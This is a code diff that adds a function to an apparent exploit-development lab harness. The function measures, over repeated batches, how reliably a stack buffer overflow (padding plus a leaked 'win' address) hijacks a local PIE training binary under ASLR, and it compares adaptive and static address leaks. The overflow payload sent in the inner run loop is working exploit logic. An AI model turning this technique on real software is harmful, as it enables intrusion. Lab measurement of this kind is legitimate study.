@@ -416,6 +416,57 @@ def op_exploit_combined(a):
     return {"times": times, "fires": fires, "reliability": fires / times if times else 0, "results": results}
 
 
+def op_assess_robustness(a):
+    # L5 measurement (develop-stage.md §2, §9): certify an exploit's reliability
+    # ACROSS ASLR-randomized runs, reported as a DISTRIBUTION over batches (the
+    # lab's report-as-a-range discipline), not a single point. Targets the PIE
+    # binary (leaks "leak: 0x<&win>").
+    #   method "adaptive": leak a fresh &win EACH run and use it (robust by design).
+    #   method "static":   leak &win ONCE and reuse it every run (fragile under ASLR).
+    # L5 verdict: robust iff every batch >= threshold.
+    method = a.get("method", "adaptive")
+    off = int(a["offset"]); batches = int(a.get("batches", 5)); runs = int(a.get("runs", 20))
+    threshold = float(a.get("threshold", 0.95)); marker_env = a.get("marker", "")
+
+    fixed = None
+    if method == "static":
+        io = process([BIN])
+        try: fixed = _read_leak(io)
+        finally:
+            try: io.close()
+            except Exception: pass
+
+    def one_run():
+        try: os.remove("/tmp/objective_marker")
+        except FileNotFoundError: pass
+        env = dict(os.environ)
+        if marker_env: env["AEGIS_MARKER"] = marker_env
+        io = process([BIN], env=env)
+        try:
+            leaked = _read_leak(io)
+            addr = fixed if method == "static" else leaked
+            if addr is None: return False
+            io.send(b"A" * off + addr.to_bytes(8, "little"))
+            io.wait(timeout=5)
+        except Exception:
+            return False
+        finally:
+            try: io.close()
+            except Exception: pass
+        return os.path.exists("/tmp/objective_marker")
+
+    rates = []
+    for _ in range(batches):
+        hits = sum(1 for _ in range(runs) if one_run())
+        rates.append(round(hits / runs, 4))
+    mn, mx = min(rates), max(rates)
+    mean = round(sum(rates) / len(rates), 4)
+    robust = all(x >= threshold for x in rates)
+    return {"method": method, "batches": batches, "runs_per_batch": runs, "per_batch_reliability": rates,
+            "range": [mn, mx], "mean": mean, "threshold": threshold,
+            "robust": robust, "level": "L5" if robust else "L4"}
+
+
 OPS = {k[3:]: v for k, v in globals().items() if k.startswith("op_")}
 
 
